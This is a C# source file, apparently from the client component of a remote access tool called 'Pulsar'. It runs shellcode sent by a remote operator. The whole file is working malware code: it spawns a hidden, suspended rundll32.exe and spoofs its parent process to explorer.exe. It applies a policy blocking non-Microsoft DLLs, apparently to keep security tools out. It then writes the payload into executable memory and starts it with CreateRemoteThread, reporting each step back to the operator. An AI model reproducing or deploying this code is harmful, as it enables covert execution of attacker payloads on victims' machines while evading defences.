using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.FunStuff;
using Pulsar.Common.Networking;

namespace Pulsar.Client.FunStuff
{
    internal class ShellcodeRunner
    {
        public void Handle(DoSendBinFile message, ISender client)
        {
            if (message?.Data == null || message.Data.Length == 0)
            {
                client.Send(new SetStatus { Message = "Error: Empty payload" });
                return;
            }

            new Thread(() =>
            {
                try
                {
                    CreateDedicatedProcess(message.Data, client);
                }
                catch (Exception ex)
                {
                    client.Send(new SetStatus { Message = $"Error: {ex.Message}" });
                }
            })
            {
                IsBackground = true
            }.Start();
        }

        private void CreateDedicatedProcess(byte[] shellcode, ISender client)
        {
            PROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
            STARTUPINFOEX startupInfoEx = new STARTUPINFOEX();
            startupInfoEx.StartupInfo.cb = Marshal.SizeOf(startupInfoEx);
            startupInfoEx.StartupInfo.dwFlags = 0x00000001;
            startupInfoEx.StartupInfo.wShowWindow = 0;

            client.Send(new SetStatus { Message = $"Creating dedicated process for {shellcode.Length} bytes..." });

            string commandLine = "rundll32.exe kernel32.dll,SleepEx 2147483647";

            // Get explorer.exe PID and directory for spoofing
            var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
            client.Send(new SetStatus { Message = $"Using PPID spoofing with parent: {parentPid}" });
            client.Send(new SetStatus { Message = $"Using directory: {parentDirectory}" });

            // Initialize attribute list
            IntPtr lpSize = IntPtr.Zero;
            InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);

            startupInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
            bool success = InitializeProcThreadAttributeList(startupInfoEx.lpAttributeList, 2, 0, ref lpSize);
            if (!success)
            {
                int error = Marshal.GetLastWin32Error();
                throw new Exception($"InitializeProcThreadAttributeList failed: 0x{error:X8}");
            }

            IntPtr parentProcessHandle = IntPtr.Zero;
            IntPtr lpValueProc = IntPtr.Zero;
            IntPtr lpMitigationPolicy = IntPtr.Zero;

            try
            {
                // Set PPID spoofing
                parentProcessHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
                if (parentProcessHandle == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"OpenProcess failed for PPID: 0x{error:X8}");
                }

                lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValueProc, parentProcessHandle);
                success = UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValueProc,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"UpdateProcThreadAttribute (PPID) failed: 0x{error:X8}");
                }

                // Set block non-Microsoft DLLs policy
                lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
                success = UpdateProcThreadAttribute(
                    startupInfoEx.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    lpMitigationPolicy,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"UpdateProcThreadAttribute (Mitigation) failed: 0x{error:X8}");
                }

                // Create process with extended startup info and spoofed directory
                success = CreateProcess(
                    null,
                    commandLine,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW | ProcessCreationFlags.EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero,
                    parentDirectory, // Use explorer.exe directory
                    ref startupInfoEx,
                    out procInfo);

                if (!success)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"CreateProcess failed: 0x{error:X8}");
                }

                // Continue with original shellcode injection logic
                InjectShellcode(shellcode, client, procInfo);
            }
            finally
            {
                // Cleanup
                if (startupInfoEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(startupInfoEx.lpAttributeList);
                    Marshal.FreeHGlobal(startupInfoEx.lpAttributeList);
                }
                if (lpValueProc != IntPtr.Zero) Marshal.FreeHGlobal(lpValueProc);
                if (lpMitigationPolicy != IntPtr.Zero) Marshal.FreeHGlobal(lpMitigationPolicy);
                if (parentProcessHandle != IntPtr.Zero) CloseHandle(parentProcessHandle);
            }
        }

        private void InjectShellcode(byte[] shellcode, ISender client, PROCESS_INFORMATION procInfo)
        {
            IntPtr remoteMemory = IntPtr.Zero;
            IntPtr remoteThread = IntPtr.Zero;

            try
            {
                client.Send(new SetStatus { Message = $"Created suspended process (PID: {procInfo.dwProcessId})" });

                remoteMemory = VirtualAllocEx(
                    procInfo.hProcess,
                    IntPtr.Zero,
                    (uint)shellcode.Length,
                    AllocationType.COMMIT | AllocationType.RESERVE,
                    MemoryProtection.EXECUTE_READWRITE);

                if (remoteMemory == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"VirtualAllocEx failed: 0x{error:X8}");
                }

                client.Send(new SetStatus { Message = $"Allocated memory at: 0x{remoteMemory:X}" });

                uint bytesWritten = 0;
                if (!WriteProcessMemory(procInfo.hProcess, remoteMemory, shellcode, (uint)shellcode.Length, ref bytesWritten))
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"WriteProcessMemory failed: 0x{error:X8} - {bytesWritten}/{shellcode.Length} bytes");
                }

                client.Send(new SetStatus { Message = $"Wrote {bytesWritten} bytes to process memory" });

                remoteThread = CreateRemoteThread(
                    procInfo.hProcess,
                    IntPtr.Zero,
                    0,
                    remoteMemory,
                    IntPtr.Zero,
                    0,
                    out uint shellcodeThreadId);

                if (remoteThread == IntPtr.Zero)
                {
                    int error = Marshal.GetLastWin32Error();
                    throw new Exception($"CreateRemoteThread failed: 0x{error:X8}");
                }

                client.Send(new SetStatus { Message = $"Created shellcode thread (ID: {shellcodeThreadId})" });

                ResumeThread(procInfo.hThread);

                CloseHandle(remoteThread);
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);

                client.Send(new SetStatus { Message = $"Shellcode executed in rundll32.exe (PID: {procInfo.dwProcessId}, Thread: {shellcodeThreadId})" });
            }
            catch
            {
                if (remoteThread != IntPtr.Zero) CloseHandle(remoteThread);
                TerminateProcess(procInfo.hProcess, 0);
                CloseHandle(procInfo.hThread);
                CloseHandle(procInfo.hProcess);
                throw;
            }
        }

        private (uint pid, string directory) GetExplorerPidAndDirectory()
        {
            Process[] explorerProcesses = Process.GetProcessesByName("explorer");
            if (explorerProcesses.Length > 0)
            {
                var explorer = explorerProcesses[0];
                string directory;

                try
                {
                    // Try to get the actual working directory of explorer.exe
                    directory = Path.GetDirectoryName(explorer.MainModule.FileName);
                    if (string.IsNullOrEmpty(directory))
                    {
                        // Fallback to Windows directory
                        directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                    }
                }
                catch
                {
                    // Fallback to Windows directory if we can't access the process
                    directory = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                }

                return ((uint)explorer.Id, directory);
            }
            throw new Exception("No explorer.exe process found for PPID spoofing");
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            ProcessCreationFlags dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            AllocationType flAllocationType,
            MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            ref uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [Flags]
        private enum ProcessCreationFlags : uint
        {
            CREATE_SUSPENDED = 0x00000004,
            CREATE_NO_WINDOW = 0x08000000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000
        }

        [Flags]
        private enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000
        }

        [Flags]
        private enum MemoryProtection : uint
        {
            EXECUTE_READWRITE = 0x40
        }

        [Flags]
        private enum ProcessAccessFlags : uint
        {
            PROCESS_CREATE_PROCESS = 0x0080,
            PROCESS_QUERY_INFORMATION = 0x0400,
            PROCESS_VM_READ = 0x0010
        }

        private const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
        private const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;
        private const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;
    }
}